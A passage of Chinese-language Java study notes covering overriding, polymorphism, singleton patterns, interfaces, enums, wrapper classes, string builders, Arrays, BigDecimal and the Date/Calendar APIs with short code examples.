<li>子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。</li>
<li>子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。</li>
<li>重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。</li>
<li>构造方法不能被重写。</li>
<li>如果不能继承一个类，则不能重写该类的方法。</li>
</ul>
<h3 id="多态">多态</h3>
<p><img src="/img/image-20230718111723719.png" alt="image-20230718111723719" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Animal animal = new Cat()  //多态向上</span><br><span class="line">Cat cat = (Cat) anima		//多态向下</span><br></pre></td></tr></table></figure>
<p><strong>instanceOf 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</strong>，用于验证和调用特殊方法（配合多态）</p>
<p><strong>equals方法</strong></p>
<h3 id="垃圾回收">垃圾回收</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.gc();//主动调用垃圾回收器</span><br><span class="line"></span><br><span class="line">//重写Finalize方法</span><br><span class="line">@Override</span><br><span class="line">protected void finalize() throws Throwable &#123;</span><br><span class="line">System.out.println(&quot;我们销毁 汽车&quot; + name );</span><br><span class="line">System.out.println(&quot;释放了某些资源...&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="类变量">类变量</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static变量是类中所有对象共享的</span><br><span class="line">//说明：类变量是随着类的加载而创建，所以即使没有创建对象实例也可以访问</span><br><span class="line">同样的类方法也可以如此</span><br></pre></td></tr></table></figure>
<h3 id="main，构造器与代码块">main，构造器与代码块</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//(1) 可以把相同的语句，放入到一个代码块中，即可</span><br><span class="line">//(2) 这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容</span><br><span class="line">//(3) 代码块调用的顺序优先于构造器.. </span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;电影屏幕打开...&quot;);</span><br><span class="line">System.out.println(&quot;广告开始...&quot;);</span><br><span class="line">System.out.println(&quot;电影正是开始...&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230718120846211.png" alt="image-20230718120846211" /></p>
<p><img src="/img/image-20230718121712078.png" alt="image-20230718121712078" /></p>
<p><img src="/img/image-20230718121800878.png" alt="image-20230718121800878" /></p>
<h3 id="单例模式">单例模式</h3>
<h4 id="1、懒汉式，线程不安全">1、懒汉式，线程不安全</h4>
<p>**是否 Lazy 初始化：**是</p>
<p>**是否多线程安全：**否</p>
<p>**实现难度：**易</p>
<p>**描述：**这种方式是最基本的实现方式，这种实现最大的问题就是不支持多线程。因为没有加锁 synchronized，所以严格意义上它并不算单例模式。<br />
这种方式 lazy loading 很明显，不要求线程安全，在多线程不能正常工作。</p>
<h4 id="实例">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;  </span><br><span class="line">    private static Singleton instance;  </span><br><span class="line">    private Singleton ()&#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public static Singleton getInstance() &#123;  </span><br><span class="line">        if (instance == null) &#123;  </span><br><span class="line">            instance = new Singleton();  </span><br><span class="line">        &#125;  </span><br><span class="line">        return instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>接下来介绍的几种实现方式都支持多线程，但是在性能上有所差异。</strong></p>
<h4 id="2、懒汉式，线程安全">2、懒汉式，线程安全</h4>
<p>**是否 Lazy 初始化：**是</p>
<p>**是否多线程安全：**是</p>
<p>**实现难度：**易</p>
<p>**描述：**这种方式具备很好的 lazy loading，能够在多线程中很好的工作，但是，效率很低，99% 情况下不需要同步。<br />
优点：第一次调用才初始化，避免内存浪费。<br />
缺点：必须加锁 synchronized 才能保证单例，但加锁会影响效率。<br />
getInstance() 的性能对应用程序不是很关键（该方法使用不太频繁）。</p>
<h4 id="实例-2">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;  </span><br><span class="line">    private static Singleton instance;  </span><br><span class="line">    private Singleton ()&#123;&#125;  </span><br><span class="line">    public static synchronized Singleton getInstance() &#123;  </span><br><span class="line">        if (instance == null) &#123;  </span><br><span class="line">            instance = new Singleton();  </span><br><span class="line">        &#125;  </span><br><span class="line">        return instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3、饿汉式">3、饿汉式</h4>
<p>**是否 Lazy 初始化：**否</p>
<p>**是否多线程安全：**是</p>
<p>**实现难度：**易</p>
<p>**描述：**这种方式比较常用，但容易产生垃圾对象。<br />
优点：没有加锁，执行效率会提高。<br />
缺点：类加载时就初始化，浪费内存。<br />
它基于 classloader 机制避免了多线程的同步问题，不过，instance 在类装载时就实例化，虽然导致类装载的原因有很多种，在单例模式中大多数都是调用 getInstance 方法， 但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化 instance 显然没有达到 lazy loading 的效果。</p>
<h4 id="实例-3">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;  </span><br><span class="line">    private static Singleton instance = new Singleton();  </span><br><span class="line">    private Singleton ()&#123;&#125;  </span><br><span class="line">    public static Singleton getInstance() &#123;  </span><br><span class="line">    return instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4、双检锁-双重校验锁（DCL，即-double-checked-locking）">4、双检锁/双重校验锁（DCL，即 double-checked locking）</h4>
<p>**JDK 版本：**JDK1.5 起</p>
<p>**是否 Lazy 初始化：**是</p>
<p>**是否多线程安全：**是</p>
<p>**实现难度：**较复杂</p>
<p>**描述：**这种方式采用双锁机制，安全且在多线程情况下能保持高性能。<br />
getInstance() 的性能对应用程序很关键。</p>
<h4 id="实例-4">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;  </span><br><span class="line">    private volatile static Singleton singleton;  </span><br><span class="line">    private Singleton ()&#123;&#125;  </span><br><span class="line">    public static Singleton getSingleton() &#123;  </span><br><span class="line">    if (singleton == null) &#123;  </span><br><span class="line">        synchronized (Singleton.class) &#123;  </span><br><span class="line">            if (singleton == null) &#123;  </span><br><span class="line">                singleton = new Singleton();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return singleton;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5、登记式-静态内部类">5、登记式/静态内部类</h4>
<p>**是否 Lazy 初始化：**是</p>
<p>**是否多线程安全：**是</p>
<p>**实现难度：**一般</p>
<p>**描述：**这种方式能达到双检锁方式一样的功效，但实现更简单。对静态域使用延迟初始化，应使用这种方式而不是双检锁方式。这种方式只适用于静态域的情况，双检锁方式可在实例域需要延迟初始化时使用。<br />
这种方式同样利用了 classloader 机制来保证初始化 instance 时只有一个线程，它跟第 3 种方式不同的是：第 3 种方式只要 Singleton 类被装载了，那么 instance 就会被实例化（没有达到 lazy loading 效果），而这种方式是 Singleton 类被装载了，instance 不一定被初始化。因为 SingletonHolder 类没有被主动使用，只有通过显式调用 getInstance 方法时，才会显式装载 SingletonHolder 类，从而实例化 instance。想象一下，如果实例化 instance 很消耗资源，所以想让它延迟加载，另外一方面，又不希望在 Singleton 类加载时就实例化，因为不能确保 Singleton 类还可能在其他的地方被主动使用从而被加载，那么这个时候实例化 instance 显然是不合适的。这个时候，这种方式相比第 3 种方式就显得很合理。</p>
<h4 id="实例-5">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;  </span><br><span class="line">    private static class SingletonHolder &#123;  </span><br><span class="line">    private static final Singleton INSTANCE = new Singleton();  </span><br><span class="line">    &#125;  </span><br><span class="line">    private Singleton ()&#123;&#125;  </span><br><span class="line">    public static final Singleton getInstance() &#123;  </span><br><span class="line">        return SingletonHolder.INSTANCE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="6、枚举">6、枚举</h4>
<p>**JDK 版本：**JDK1.5 起</p>
<p>**是否 Lazy 初始化：**否</p>
<p>**是否多线程安全：**是</p>
<p>**实现难度：**易</p>
<p>**描述：**这种实现方式还没有被广泛采用，但这是实现单例模式的最佳方法。它更简洁，自动支持序列化机制，绝对防止多次实例化。<br />
这种方式是 Effective Java 作者 Josh Bloch 提倡的方式，它不仅能避免多线程同步问题，而且还自动支持序列化机制，防止反序列化重新创建新的对象，绝对防止多次实例化。不过，由于 JDK1.5 之后才加入 enum 特性，用这种方式写不免让人感觉生疏，在实际工作中，也很少用。<br />
不能通过 reflection attack 来调用私有构造方法。</p>
<h4 id="实例-6">实例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum Singleton &#123;  </span><br><span class="line">    INSTANCE;  </span><br><span class="line">    public void whateverMethod() &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**经验之谈：**一般情况下，不建议使用第 1 种和第 2 种懒汉方式，建议使用第 3 种饿汉方式。只有在要明确实现 lazy loading 效果时，才会使用第 5 种登记方式。如果涉及到反序列化创建对象时，可以尝试使用第 6 种枚举方式。如果有其他特殊的需求，可以考虑使用第 4 种双检锁方式。</p>
<h3 id="final">final</h3>
<p><img src="/img/image-20230718172541108.png" alt="image-20230718172541108" /></p>
<h3 id="抽象类">抽象类</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//抽象类不一定要包含 abstract 方法。也就是说,抽象类可以没有 abstract 方法</span><br><span class="line">//还可以有实现的方法。</span><br><span class="line">//abstract 只能修饰类和方法，不能修饰属性和其它的</span><br><span class="line">//如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</span><br></pre></td></tr></table></figure>
<h3 id="接口">接口</h3>
<p><img src="/img/image-20230718173814577.png" alt="image-20230718173814577" /></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UsbInterface</span> &#123; <span class="comment">//接口</span></span><br><span class="line"><span class="comment">//规定接口的相关方法,即规范... </span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Camera</span> <span class="keyword">implements</span> <span class="title class_">UsbInterface</span>&#123;<span class="comment">//实现接口,就是把接口方法实现</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;相机开始工作...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;相机停止工作....&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230718174055429.png" alt="image-20230718174055429" /></p>
<p><img src="/img/image-20230718174512505.png" alt="image-20230718174512505" /></p>
<p>接口的多态还是需要进行多态的上下行，并且多态具有传递现象，如果B接口继承了A接口，C类实现了B接口中继承的A接口方法，就相当于实现了A接口的方法</p>
<h3 id="内部类和匿名类">内部类和匿名类</h3>
<p>内部类：在类的内部定义，想要访问内部类的话就进行实例化就行（需要从该类进行对象的调用，因为内部类不是显式的）</p>
<p>匿名类：重新定义类的方法和逻辑（相当于继承和重写接口，但是不会执行多次）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        AnonymousDemo an = new AnonymousDemo();</span><br><span class="line">        an.createClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Polygon &#123;</span><br><span class="line">    public void display() &#123;</span><br><span class="line">        System.out.println(&quot;在 Polygon 类内部&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AnonymousDemo &#123;</span><br><span class="line">    public void createClass() &#123;</span><br><span class="line"></span><br><span class="line">        // 创建的匿名类继承了 Polygon 类</span><br><span class="line">        Polygon p1 = new Polygon() &#123;</span><br><span class="line">            public void display() &#123;</span><br><span class="line">                System.out.println(&quot;在匿名类内部。&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p1.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以进行调用</p>
<h3 id="枚举类">枚举类</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum Day &#123;</span><br><span class="line">    MONDAY(1, &quot;星期一&quot;, &quot;各种不在状态&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return TUESDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    TUESDAY(2, &quot;星期二&quot;, &quot;依旧犯困&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return WEDNESDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    WEDNESDAY(3, &quot;星期三&quot;, &quot;感觉半周终于过去了&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return THURSDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    THURSDAY(4, &quot;星期四&quot;, &quot;期待这星期五&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return FRIDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    FRIDAY(5, &quot;星期五&quot;, &quot;感觉还不错&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return SATURDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    SATURDAY(6, &quot;星期六&quot;, &quot;感觉非常好&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return SUNDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    SUNDAY(7, &quot;星期日&quot;, &quot;感觉周末还没过够。。。&quot;)&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public Day getNext() &#123;</span><br><span class="line">            return MONDAY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Day(int index, String name, String value) &#123;</span><br><span class="line">        this.index = index;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int index;</span><br><span class="line">    private String name;</span><br><span class="line">    private String value;</span><br><span class="line">    public abstract Day getNext();</span><br><span class="line"></span><br><span class="line">    public int getIndex() &#123;</span><br><span class="line">        return index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setIndex(int index) &#123;</span><br><span class="line">        this.index = index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getValue() &#123;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setValue(String value) &#123;</span><br><span class="line">        this.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>能够自动构造出变量的初始化以及自由的扩展度</p>
<h2 id="常用类">常用类</h2>
<h3 id="包装类">包装类</h3>
<p>包装类通过对八种基本类型相应的引用类型，使得八种数据基本类型具有了类的特点</p>
<h4 id="int-Integer">int &lt;-&gt; Integer</h4>
<p>对于两者之间的转化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int n1 = 100;</span><br><span class="line">Integer integer = new Integer(n1);</span><br><span class="line">Integer integer1 = Integer.valueOf(n1);</span><br><span class="line">int i = integer.intValue();</span><br></pre></td></tr></table></figure>
<p>注意点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object obj1 = true? new Integer(1):new Double(2.0);</span><br><span class="line">System.out.println(obj1);</span><br><span class="line">//该代码将会输出1.0</span><br><span class="line">三元运算符是一个整体，会将精度提升到最高，所以是1.0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Integer和int的比较</span><br><span class="line"></span><br><span class="line">1）由于Integer变量实际上是对一个Integer对象的引用，所以两个通过new生成的Integer变量永远是不相等的（因为new生成的是两个对象，其内存地址不同）。</span><br><span class="line">Integer i = new Integer(1);</span><br><span class="line">Integer j = new Integer(1);</span><br><span class="line">System.out.print(i == j); //false</span><br><span class="line"></span><br><span class="line">2）Integer变量和int变量比较时，只要两个变量的值是向等的，则结果为true（因为包装类Integer和基本数据类型int比较时，java会自动将Integer拆箱为int，然后进行比较，实际上就变为两个int变量的比较）</span><br><span class="line">Integer i = new Integer(1);</span><br><span class="line">int j = 1；</span><br><span class="line">System.out.print(i == j); //true</span><br><span class="line"></span><br><span class="line">3）非new生成的Integer变量和new Integer()生成的变量比较时，结果为false。（因为非new生成的Integer变量指向的是java常量池中的对象，而new Integer()生成的变量指向堆中新建的对象，两者在内存中的地址不同）</span><br><span class="line">Integer i = new Integer(1);</span><br><span class="line">Integer j = 1;</span><br><span class="line">System.out.print(i == j); //false</span><br><span class="line"></span><br><span class="line">4）对于两个非new生成的Integer对象，进行比较时，如果两个变量的值在区间-128到127之间，则比较结果为true，如果两个变量的值不在此区间，则比较结果为false</span><br><span class="line">Integer i = 110;</span><br><span class="line">Integer j = 110;</span><br><span class="line">System.out.print(i == j); //true（因为-128到127java已经进行了缓存，所以i和j指向的是同一块内存，即同样的引用地址）</span><br><span class="line">Integer i = 128;  </span><br><span class="line">Integer j = 128;</span><br><span class="line">System.out.print(i == j); //false</span><br><span class="line">java在编译Integer i = 110 时，会翻译成为Integer i = Integer.valueOf(110)；而java API中对Integer类型的valueOf的定义如下：</span><br><span class="line">public static Integer valueOf(int i)&#123;</span><br><span class="line">    assert IntegerCache.high &gt;= 127;</span><br><span class="line">    if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)&#123;</span><br><span class="line">        return IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">    &#125;</span><br><span class="line">    return new Integer(i);</span><br><span class="line">&#125;</span><br><span class="line">java对于-128到127之间的数，会进行缓存，Integer i = 127时，会将127进行缓存，下次再写Integer j = 127时，就会直接从缓存中取，就不会new了</span><br></pre></td></tr></table></figure>
<h4 id="String">String</h4>
<p><img src="/img/image-20230719211826900.png" alt="image-20230719211826900" /></p>
<p><img src="/img/image-20230719211903915.png" alt="image-20230719211903915" /></p>
<p><img src="/img/image-20230720160752297.png" alt="image-20230720160752297" /></p>
<p><img src="/img/image-20230720160813039.png" alt="image-20230720160813039" /></p>
<h4 id="String-StringBuffer">String &lt;-&gt; StringBuffer</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String str = &quot;hello tom&quot;;</span><br><span class="line">//方式 1 使用构造器</span><br><span class="line">//注意： 返回的才是 StringBuffer 对象，对 str 本身没有影响</span><br><span class="line">StringBuffer stringBuffer = new StringBuffer(str);</span><br><span class="line">//方式 2 使用的是 append 方法</span><br><span class="line">StringBuffer stringBuffer1 = new StringBuffer();</span><br><span class="line">stringBuffer1 = stringBuffer1.append(str);</span><br><span class="line">//看看 StringBuffer -&gt;String</span><br><span class="line">StringBuffer stringBuffer3 = new StringBuffer(&quot;韩顺平教育&quot;);</span><br><span class="line">//方式 1 使用 StringBuffer 提供的 toString 方法</span><br><span class="line">String s = stringBuffer3.toString();</span><br><span class="line">//方式 2: 使用构造器来搞定</span><br><span class="line">String s1 = new String(stringBuffer3)</span><br></pre></td></tr></table></figure>
<h4 id="StringBuffer-类常见方法">StringBuffer 类常见方法</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//增</span><br><span class="line">s.append(&#x27;,&#x27;);// &quot;hello,&quot;</span><br><span class="line">//删</span><br><span class="line">s.delete(11, 14);</span><br><span class="line">//改</span><br><span class="line">s.replace(9, 11, &quot;周芷若&quot;);</span><br><span class="line">//查找指定的子串在字符串第一次出现的索引，如果找不到返回-1</span><br><span class="line">int indexOf = s.indexOf(&quot;张三丰&quot;);</span><br><span class="line">System.out.println(indexOf);//6</span><br><span class="line">//插</span><br><span class="line">s.insert(9, &quot;赵敏&quot;);</span><br><span class="line">//长度</span><br><span class="line">System.out.println(s.length());</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. StringBuffer 的直接父类 是 AbstractStringBuilder</span><br><span class="line">//2. StringBuffer 实现了 Serializable, 即 StringBuffer 的对象可以串行化</span><br><span class="line">//3. 在父类中 AbstractStringBuilder 有属性 char[] value,不是 fina</span><br><span class="line">//4. StringBuffer 是一个 final 类，不能被继承</span><br><span class="line">//5. 因为 StringBuffer 字符内容是存在 char[] value, 所有在变化(增加/删除</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. StringBuilder 继承 AbstractStringBuilder 类</span><br><span class="line">//2. 实现了 Serializable ,说明 StringBuilder 对象是可以串行化(对象可以网络传输,可以保存到文件)</span><br><span class="line">//3. StringBuilder 是 final 类, 不能被继承</span><br><span class="line">//4. StringBuilder 对象字符序列仍然是存放在其父类 AbstractStringBuilder 的 char[] value;</span><br><span class="line">// 因此，字符序列是堆中</span><br><span class="line">//5. StringBuilder 的方法，没有做互斥的处理,即没有 synchronized 关键字,因此在单线程的情况下使用</span><br><span class="line">// StringBuilder</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230720215917270.png" alt="image-20230720215917270" /></p>
<p><img src="/img/image-20230720215933356.png" alt="image-20230720215933356" /></p>
<h4 id="Arrays">Arrays</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Arrays.toString()打印数组</span><br><span class="line">2、Arrays.equals(int[] a, int[] a2)比较两个数组是否相同</span><br><span class="line">3、Arrays.copyOf(int[] original, int newLength)复制指定的数组---效率低，会重新开辟新的数组空间original - 要复制的数组;newLength - 要返回的副本的长度</span><br><span class="line">4、Arrays.fill(int[] a, int val)/Arrays.fill(int[] a, int fromIndex, int toIndex, int val)填充数组</span><br><span class="line">5、Arrays.sort(int[] a);对数组进行升序排序</span><br><span class="line">6、Arrays.binarySearch(int[] a, int key)二分法查找</span><br></pre></td></tr></table></figure>
<h4 id="System">System</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、拷贝数组arraycopy</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        int[] arr1 = &#123;1,2,3,4,5 &#125;;</span><br><span class="line">        int[] arr2 = &#123; 6,7,8,9,10&#125;;</span><br><span class="line">        /*</span><br><span class="line">         * 第一个参数arr1：被复制的数组</span><br><span class="line">         * 第二个参数1：arr1中要复制的起始位置</span><br><span class="line">         * 第三个参数arr2：目标数组</span><br><span class="line">         * 第四个参数0：目标数组的复制起始位置</span><br><span class="line">         * 第五个参数3：目标数组的复制结束位置</span><br><span class="line">         */</span><br><span class="line">        System.arraycopy(arr1, 1, arr2, 0, 3);</span><br><span class="line">        for (int i = 0; i &lt; 5; i++)</span><br><span class="line">            System.out.print(arr2[i] + &quot; &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">2、获取系统时间</span><br><span class="line">System.out.println(System.currentTimeMillis());</span><br><span class="line">System.out.println(System.nanoTime());</span><br><span class="line">3、垃圾回收相关操作：System.gc</span><br></pre></td></tr></table></figure>
<h4 id="BigInteger-和-BigDecimal">BigInteger 和 BigDecimal</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//当我们编程中，需要处理很大的整数，long 不够用</span><br><span class="line">//可以使用 BigInteger</span><br><span class="line">BigInteger bigInteger = new BigInteger(&quot;23788888899999999999999999999&quot;);</span><br><span class="line">BigInteger add = bigInteger.add(bigInteger2);</span><br><span class="line">System.out.println(add);//</span><br><span class="line">BigInteger subtract = bigInteger.subtract(bigInteger2);</span><br><span class="line">System.out.println(subtract);//减</span><br><span class="line">BigInteger multiply = bigInteger.multiply(bigInteger2);</span><br><span class="line">System.out.println(multiply);//乘</span><br><span class="line">BigInteger divide = bigInteger.divide(bigInteger2);</span><br><span class="line">System.out.println(divide);//除</span><br><span class="line"></span><br><span class="line">//当我们需要保存一个精度很高的数时，double 不够用</span><br><span class="line">//可以是 BigDecimal</span><br><span class="line">//1. 如果对 BigDecimal 进行运算，比如加减乘除，需要使用对应的方法</span><br><span class="line">//2. 创建一个需要操作的 BigDecimal 然后调用相应的方法即可</span><br><span class="line">System.out.println(bigDecimal.add(bigDecimal2));</span><br><span class="line">System.out.println(bigDecimal.subtract(bigDecimal2));</span><br><span class="line">System.out.println(bigDecimal.multiply(bigDecimal2));</span><br><span class="line">//System.out.println(bigDecimal.divide(bigDecimal2));//可能抛出异常 ArithmeticException</span><br><span class="line">//在调用 divide 方法时，指定精度即可. BigDecimal.ROUND_CEILING</span><br><span class="line">//如果有无限循环小数，就会保留 分子 的精度</span><br></pre></td></tr></table></figure>
<h4 id="时间">时间</h4>
<h5 id="第一代">第一代</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date d1 = new Date(); //获取当前系统时间</span><br><span class="line">System.out.println(&quot;当前日期=&quot; + d1);</span><br><span class="line">Date d2 = new Date(9234567); //通过指定毫秒数得到时间</span><br><span class="line">System.out.println(&quot;d2=&quot; + d2); //获取某个时间对应的毫秒数</span><br><span class="line">//1. 创建 SimpleDateFormat 对象，可以指定相应的格式</span><br><span class="line">//2. 这里的格式使用的字母是规定好，不能乱写</span><br><span class="line">SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy 年 MM 月 dd 日 hh:mm:ss E&quot;);</span><br><span class="line">String format = sdf.format(d1); // format:将日期转换成指定格式的字符串</span><br><span class="line">System.out.println(&quot;当前日期=&quot; + format);</span><br><span class="line"></span><br><span class="line">//1. 可以把一个格式化的 String 转成对应的 Date</span><br><span class="line">//2. 得到 Date 仍然在输出时，还是按照国外的形式，如果希望指定格式输出，需要转换</span><br><span class="line">//3. 在把 String -&gt; Date ， 使用的 sdf 格式需要和你给的 String 的格式一样，否则会抛出转换异常</span><br><span class="line">String s = &quot;1996 年 01 月 01 日 10:20:30 星期一&quot;;</span><br><span class="line">Date parse = sdf.parse(s);</span><br><span class="line">System.out.println(&quot;parse=&quot; + sdf.format(parse));</span><br></pre></td></tr></table></figure>
<h5 id="第二代">第二代</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. Calendar 是一个抽象类， 并且构造器是 private</span><br><span class="line">//2. 可以通过 getInstance() 来获取实例</span><br><span class="line">//3. 提供大量的方法和字段提供给程序员</span><br><span class="line">//4. Calendar 没有提供对应的格式化的类，因此需要程序员自己组合来输出(灵活)</span><br><span class="line">//5. 如果我们需要按照 24 小时进制来获取时间， Calendar.HOUR ==改成=&gt; Calendar.HOUR_OF_DAY</span><br><span class="line">Calendar c = Calendar.getInstance(); //创建日历类对象//比较简单，自由</span><br><span class="line">System.out.println(&quot;c=&quot; + c);</span><br><span class="line">//2.获取日历对象的某个日历字段</span><br><span class="line">System.out.println(&quot;年：&quot; + c.get(Calendar.YEAR));</span><br><span class="line">// 这里为什么要 + 1, 因为 Calendar 返回月时候，是按照 0 开始编号</span><br><span class="line">System.out.println(&quot;月：&quot; + (c.get(Calendar.MONTH) + 1));</span><br><span class="line">System.out.println(&quot;日：&quot; + c.get(Calendar.DAY_OF_MONTH));</span><br><span class="line">System.out.println(&quot;小时：&quot; + c.get(Calendar.HOUR));</span><br><span class="line">System.out.println(&quot;分钟：&quot; + c.get(Calendar.MINUTE));</span><br><span class="line">System.out.println(&quot;秒：&quot; + c.get(Calendar.SECOND));</span><br><span class="line">//Calender 没有专门的格式化方法，所以需要程序员自己来组合显示</span><br><span class="line">System.out.println(c.get(Calendar.YEAR) + &quot;-&quot; + (c.get(Calendar.MONTH) + 1) + &quot;-&quot; +</span><br><span class="line">c.get(Calendar.DAY_OF_MONTH) +</span><br><span class="line">&quot; &quot; + c.get(Calendar.HOUR_OF_DAY) + &quot;:&quot; + c.get(Calendar.MINUTE) + &quot;:&quot; + c.get(Calendar.SECOND) );</span><br></pre></td></tr></table></figure>
<h5 id="第三代">第三代</h5>
